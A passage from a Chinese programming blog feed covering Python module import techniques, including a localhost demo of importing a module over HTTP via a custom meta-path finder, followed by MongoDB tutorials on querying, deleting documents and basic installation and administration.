class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> import </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB删除数据</title>
      <link href="/2018/03/14/MongoDB/MongoDB%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/"/>
      <url>/2018/03/14/MongoDB/MongoDB%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="MySQL和MongoDB对比删除操作"><a href="#MySQL和MongoDB对比删除操作" class="headerlink" title="MySQL和MongoDB对比删除操作"></a><strong>MySQL和MongoDB对比删除操作</strong></h4><ul><li><strong>MySQL</strong>:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from tableName where ...</span><br></pre></td></tr></table></figure></li><li><strong>MongoDB</strong>:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.remove(query,justOne)</span><br></pre></td></tr></table></figure></li><li>功能: 删除指定的文档</li><li>参数:<ul><li>query: 筛选要删除的文档,类似where子句,同法同查找操作</li><li>justOne: 布尔值 , 默认为 false 表示删除所有筛选数据,如果赋值为true 则表示只删除第一条符合的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.删除age域不存在 或者 age域大于100的文档</span><br><span class="line">db.class0.remove(&#123;$or:[&#123;age:&#123;$exists:false&#125;&#125;,&#123;age:&#123;$gt:100&#125;&#125;]&#125;)</span><br><span class="line"></span><br><span class="line">e.g.删除第一个符合条件的文档</span><br><span class="line">db.class0.remove(&#123;sex:&#123;exists:false&#125;&#125;,true)</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>删除集合中所有文档</strong></p><pre><code>db.collectionName.remove({})e.g.db.class1.remove({})</code></pre>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB查询数据</title>
      <link href="/2018/03/13/MongoDB/MongoDB%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/"/>
      <url>/2018/03/13/MongoDB/MongoDB%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="MySQL和MongoDB查找操作对比"><a href="#MySQL和MongoDB查找操作对比" class="headerlink" title="MySQL和MongoDB查找操作对比"></a><strong>MySQL和MongoDB查找操作对比</strong></h4><pre><code>mysql:select ... from tableName where ...db.collectionName.find()    同mysql-&gt; select * from tableName</code></pre><h4 id="find-query-field-查找函数"><a href="#find-query-field-查找函数" class="headerlink" title="find(query,field)查找函数"></a><strong>find(query,field)</strong>查找函数</h4><ul><li>功能: 查找所有复合条件的文档</li><li>参数:<ul><li>query:    筛选条件 相当于where子句</li><li>field:    展示的域 相当于select的展示部分</li></ul></li><li>返回: 返回所有查找到的内容</li></ul><p><strong>field 参数</strong>: 选择要展示的域 传一组键值对</p><ul><li><p>键表示域名</p></li><li><p>值表示是否显示该域 0 表示不显示 1 表示显示</p></li><li><p>如果某个域给定0 则表示不显示该域,其他的域均显示</p></li><li><p>如果某个域给定1 则表示显示该域,其他的域都不显示</p></li><li><p><code>_id</code> 永远默认为显示,除非设置为0</p></li><li><p>除_id外其他域必须拥有相同的设置,全为0或者全为1</p></li><li><p>如果不写该参数则表示显示所有域内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0&#125;)</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0,name:1&#125;)</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0,name:1,age:1&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>query参数</strong>: 以键值对的形式给出查找条件</p><ul><li>查找年龄 17<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;age:17&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li><li>如果不写第一个参数则表示查找所有内容</li></ul><h5 id="findOne"><a href="#findOne" class="headerlink" title="findOne()"></a><strong>findOne()</strong></h5><ul><li>功能参数和 <code>find()</code> 完全相同,只是只返回第一条查找到的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.findOne(&#123;age:17&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="query的更多用法"><a href="#query的更多用法" class="headerlink" title="query的更多用法"></a><strong>query的更多用法</strong></h4><ul><li>操作符: 使用$符号注明一个特殊字符串,表示一定的含义<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$lt#表示小于</span><br></pre></td></tr></table></figure></li></ul><h5 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a><strong>比较操作符</strong></h5><pre><code>$eq        #等于    ==db.class0.find({age:{$eq:17}},{_id:0})#筛选年龄等于17的db.class0.find({age:17},{_id:0})    #直接查一样,等于一般用得少$lt        #小于    &lt;db.class0.find({age:{$lt:17}},{_id:0})#mongo中字符串也可以比较大小$lte    #小于等于    &lt;=db.class0.find({age:{$lte:17}},{_id:0})$gt        #大于    &gt;db.class0.find({age:{$gt:17}},{_id:0})$gte    #大于等于    &gt;=db.class0.find({age:{$gte:17}},{_id:0})$ne        #不等于        !=db.class0.find({age:{$ne:17}},{_id:0})#如果一个文档没有这个age域也显示为不等于$in        #包含db.class0.find({age:{$in:[16,17,18]}},{_id:0})#nin    #不包含db.class0.find({age:{$nin:[16,17,18]}},{_id:0})</code></pre><h5 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a><strong>逻辑操作符</strong></h5><pre><code>$and    #逻辑与#年龄小于19且性别是男db.class0.find({age:{$lt:19},sex:&apos;m&apos;},{_id:0})#年龄小于19且大于15db.class0.find({age:{$lt:19,$gt:15}},{_id:0})$and逻辑语法db.class0.find({$and:[{age:17},{name:&apos;Lei&apos;}]})$or        #逻辑或db.class0.find({$or:[{age:{$lt:22}},{name:&apos;wukong&apos;}]},{_id:0})db.class0.find({$or:[{age:{lt:18}},{age:{$gt:30}}]},{_id:0})$not    #逻辑非db.class0.find({age:{$not:{$eq:17}}},{_id:0})$nor    #既不也不db.class0.find({$nor:[{age:{$gt:18}},{sex:&apos;m&apos;}]},{_id:0})</code></pre><p><strong>条件混合</strong></p><ul><li>(年龄小于20 <strong>或者</strong> 姓名为Lei) <strong>并且</strong> 性别为女的人<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;$and:[&#123;$or:[&#123;age:&#123;$lt:20&#125;&#125;,&#123;name:&#39;Lily&#39;&#125;]&#125;,&#123;sex:&#39;w&#39;&#125;]&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="数组查找"><a href="#数组查找" class="headerlink" title="数组查找"></a><strong>数组查找</strong></h4><pre><code>#查看数组中包含某一项的db.class1.find({hobby:&apos;python&apos;},{_id:0})$all#查找一个数组中同时包含多项的文档db.class1.find({hobby:{$all:[&apos;python&apos;,&apos;mongodb&apos;]}},{_id:0})$size#查找数组元素个数为指定个数的文档db.class1.find({hobby:{$size:3}},{_id:0})#数组切片显示,对数组进行切片显示$slicedb.class1.find({hobby:{$size:3}},{_id:0,hobby:{$slice:2}})             #显示前两项db.class1.find({hobby:{$size:3}},{_id:0,hobby:{$slice:[1,2]}})        #显示后两项</code></pre><h4 id="其它查找方法"><a href="#其它查找方法" class="headerlink" title="其它查找方法"></a><strong>其它查找方法</strong></h4><pre><code>#判断一个域是否存在$existse.g.    查找存在hobby域的文档db.class1.find({hobby:{$exists:true}},{_id:0})e.g.    查找不存在sex域的文档db.class1.find({sex:{$exists:false}},{_id:0})$mod#做除数余数查找e.g        查找age域 被2除余1的文档,就是单数db.class1.find({age:{$mod:[2,1]}},{_id:0})e.g        查找age域 被3除余0的文档,整除db.class1.find({age:{$mod:[3,0]}},{_id:0})$type#查找指定数据类型的文档#monggodb为每种数据类型作了编号,对照如下官方文档https://docs.mongodb.com/manual/reference/operator/query/type/index.htmle.g.    查找age域为整数类型db.class1.find({age:{$type:1}},{_id:0})e.g.    查找name域为字符串类型db.class1.find({name:{$type:2}},{_id:0})e.g.    查找hobby域为数组类型db.class1.find({hobby:{$type:4}},{_id:0])</code></pre><h4 id="进一步的信息筛选"><a href="#进一步的信息筛选" class="headerlink" title="进一步的信息筛选"></a><strong>进一步的信息筛选</strong></h4><p><strong>distinct()函数</strong> 去重</p><ul><li>功能: 查看一个集合中某个域值的覆盖范围  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g. 查看集合中hobby域的值都有哪些</span><br><span class="line">db.class1.distinct(&#39;hobby&#39;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>pretty(n)</strong> 格式化显示</p><ul><li>功能: 将查询结果格式化显示  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find().pretty()</span><br></pre></td></tr></table></figure></li></ul><p><strong>limit(n)</strong> 限制</p><ul><li>功能: 查询结果显示前 n条  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.查询结果显示前3个</span><br><span class="line">db.class1.find(&#123;&#125;&#123;_id:0&#125;).limit(3)</span><br></pre></td></tr></table></figure></li></ul><p><strong>skip(n)</strong></p><ul><li>功能: 查询结果跳过前 n条  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.显示时跳过前3条</span><br><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;).skip(3)</span><br></pre></td></tr></table></figure></li></ul><p><strong>count()</strong> 计数</p><ul><li>功能: 对查找结果计数统计  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.统计sex字段为m的文档数量</span><br><span class="line">db.class0.find(&#123;sex:&#39;m&#39;&#125;,&#123;_id:0&#125;).count()</span><br></pre></td></tr></table></figure></li></ul><p><strong>sort({键:1/-1})</strong></p><ul><li>功能: 对查找结果排序</li><li>1表示按照升序排列, -1表示按照降序排列  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.对查询结果按照年龄升序排列</span><br><span class="line">db.class1.find(&#123;age:&#123;$exists:true&#125;&#125;,&#123;_id:0&#125;).sort(&#123;age:1&#125;)</span><br><span class="line"></span><br><span class="line">e.g复合排序: 当第一排序项相同的时候,按照第二排序项排序</span><br><span class="line">db.class1.find(&#123;age:&#123;$exists:true&#125;&#125;,&#123;_id:0&#125;).sort(&#123;age:1,name:-1&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="函数的连续使用"><a href="#函数的连续使用" class="headerlink" title="函数的连续使用"></a><strong>函数的连续使用</strong></h4><ul><li>获取集合中年龄最小的前3个文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;).sort(&#123;age:1&#125;).limit(3)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非关系型数据库MongoDB简介</title>
      <link href="/2018/03/12/MongoDB/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93MongoDB%E7%AE%80%E4%BB%8B/"/>
      <url>/2018/03/12/MongoDB/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93MongoDB%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="非关系型数据库-NoSQL-–-gt-Not-only-SQL"><a href="#非关系型数据库-NoSQL-–-gt-Not-only-SQL" class="headerlink" title="非关系型数据库 (NoSQL –&gt; Not only SQL)"></a><strong>非关系型数据库</strong> (NoSQL –&gt; Not only SQL)</h4><ul><li><p><strong>优点</strong>:</p><ul><li>高并发,大数据读写能力强</li><li>支持分布式,容易扩展</li><li>弱化了数据结构,降低了数据的一致性</li></ul></li><li><p><strong>缺点</strong></p><ul><li>通用性差,没有像SQL那样一致的操作</li><li>操作灵活,容易混乱</li><li>没有join,有些NoSQL没有事务支持等操作</li></ul></li></ul><h4 id="什么场景需要使用到NoSQL"><a href="#什么场景需要使用到NoSQL" class="headerlink" title="什么场景需要使用到NoSQL?"></a><strong>什么场景需要使用到NoSQL?</strong></h4><ul><li>数据一致性要求低</li><li>数据库并发处理要求高</li><li>数据库设计时对大小的估算不确定,需要分布拓展</li><li>给定的数据比较容易建立起NoSQL的模型</li></ul><h4 id="NoSQL分类"><a href="#NoSQL分类" class="headerlink" title="NoSQL分类"></a><strong>NoSQL分类</strong></h4><ol><li><p>键值型数据库</p><ul><li>Redis, Oracle, BDB, tokyo</li></ul></li><li><p>列存储数据库</p><ul><li>HBase</li></ul></li><li><p>文档型数据库</p><ul><li>MongoDB, CouchDB</li></ul></li><li><p>图形数据库</p></li></ol><blockquote><h4 id="MongoDB简介-非关系型-文档型数据库"><a href="#MongoDB简介-非关系型-文档型数据库" class="headerlink" title="MongoDB简介 (非关系型,文档型数据库)"></a><strong>MongoDB简介</strong> (非关系型,文档型数据库)</h4></blockquote><ol><li>MongoDB 是由C++语言编写的,是一个基于分布式文件存储的开源数据库管理系统.</li><li>支持非常丰富的增删改查数据操作,被评为最像关系型数据库的非关系型数据库</li><li>支持非常丰富的数据类型</li><li>使用方便,便于部署,支持分布式,容易拓展</li><li>支持众多的编程语言接口(python,ruby,c++,php…)</li></ol><p><strong>组成结构</strong><br>键值对 —&gt; 文档 —&gt; 集合 —&gt; 数据库</p><h4 id="MongoDB-安装"><a href="#MongoDB-安装" class="headerlink" title="MongoDB 安装"></a><strong>MongoDB 安装</strong></h4><p><strong>linux自动安装</strong></p><pre><code>apt-get install mongodb#默认安装位置    /var/lib/mongodb/#配置文件        /etc/mongodb.conf#命令集            /usr/bin</code></pre><p><strong>手动安装</strong></p><pre><code>#下载解压wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian92-4.2.8.tgztar -zxvf mongodb-linux-x86_64-debian92-4.2.8.tgzmv mongodb-linux-x86_64-debian92-4.2.8.tgz /usr/local/mongodb4#将文件夹下的命令集目录(bin目录)添加到环境变量PATH=$PATH:/usr/local/mongodb4/binexport PATH将以上两句写在 /etc/rc.local重启系统</code></pre><ul><li><code>mongodb</code> 命令  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath 目录路径</span><br><span class="line">#设置数据库存储位置</span><br><span class="line"></span><br><span class="line">mongod --port 8888</span><br><span class="line">#设置端口号(默认27017)</span><br></pre></td></tr></table></figure></li><li><code>mongo</code> 命令  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">#进入mongodb的交互shell界面用来操作数据库</span><br></pre></td></tr></table></figure><h4 id="mysql-和-mongodb-概念对比"><a href="#mysql-和-mongodb-概念对比" class="headerlink" title="mysql 和 mongodb 概念对比"></a><strong>mysql 和 mongodb 概念对比</strong></h4></li></ul><table><thead><tr><th align="center">mysql</th><th align="center">mongo</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">database</td><td align="center">database</td><td align="center">数据库</td></tr><tr><td align="center">table</td><td align="center">collection</td><td align="center">表/集合</td></tr><tr><td align="center">column</td><td align="center">field</td><td align="center">字段/域</td></tr><tr><td align="center">row</td><td align="center">document</td><td align="center">记录/文档</td></tr><tr><td align="center">index</td><td align="center">index</td><td align="center">索引</td></tr></tbody></table><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a><strong>创建数据库</strong></h4><pre><code>use databasename#创建一个名为stu的数据库use stu</code></pre><ul><li>use实际功能是表示选择使用哪个数据库,当这个数据库不存在时即表示创建该数据库</li><li>使用use后数据库并不会马上被创建,而是需要插入数据后数据库才会被创建</li></ul><p><strong>数据库名称规则</strong></p><ul><li>原则上是任意满足以下几条的utf-8字符<ol><li>不能是空字符,不能含有空格’ ‘,点 ‘.’ ‘/‘ ‘&#39; ‘\0’</li><li>习惯上使用英文小写</li><li>长度不超过64字节</li><li>不能使用 admin local config 这样的名字</li></ol></li></ul><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a><strong>查看数据库</strong></h5><pre><code>show dbs#mongo系统库admin: 存储用户local: 存储本地数据config: 存储分片配置信息</code></pre><ul><li><strong>db</strong> : mongo系统全局变量,代表你当前正在使用的数据库<ul><li>db 默认为test 如果插入数据即创建test数据库</li></ul></li></ul><h4 id="数据库的备份和恢复"><a href="#数据库的备份和恢复" class="headerlink" title="数据库的备份和恢复"></a><strong>数据库的备份和恢复</strong></h4><ul><li>备份  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongodump -h dbhost -d dbname -o dbdir</span><br><span class="line">mongodump -h 127.0.0.1 -d stu -o stu</span><br><span class="line">#将本机下 stu 数据库备份到 当前目录的stu文件夹中,会在stu文件夹中自动生成一个stu文件夹则为备份文件</span><br></pre></td></tr></table></figure></li><li>恢复  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongorestore -h &lt;dbhost&gt;:&lt;port&gt; -d dbname &lt;path&gt;</span><br><span class="line">mongorestore -h 127.0.0.1:27017 -d test stu&#x2F;stu</span><br><span class="line">#将stu文件夹下的备份文件stu恢复到本机的test数据库</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据库的监测命令"><a href="#数据库的监测命令" class="headerlink" title="数据库的监测命令"></a><strong>数据库的监测命令</strong></h4><p><strong>mongostat</strong></p><ul><li>insert query update delete        #每秒增查改删的次数</li><li>getmore command                 #每秒运行命令次数</li><li>dirty used flusher                #每秒操作磁盘的次数</li><li>vsize res                        #使用虚拟内存和物理内存</li></ul><p><strong>mongotop</strong></p><ul><li>监测每个数据库的读写时长</li></ul><table><thead><tr><th align="center">ns</th><th align="center">total</th><th align="center">read</th><th align="center">write</th></tr></thead><tbody><tr><td align="center">数据集合</td><td align="center">总时长</td><td align="center">读时长</td><td align="center">写时长</td></tr></tbody></table><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a><strong>删除数据库</strong></h4><pre><code>db.dropDatabase()#删除db所代表的数据库</code></pre><h4 id="集合-表-的创建"><a href="#集合-表-的创建" class="headerlink" title="集合(表)的创建"></a>集合(表)的创建</h4><pre><code>db.createCollection(collection_name)db.createCollection(&quot;class2&quot;)#在当前数据库下创建一个名字为class2的集合</code></pre><p><strong>查看数据库中的集合</strong>    </p><pre><code>show collectionsshow 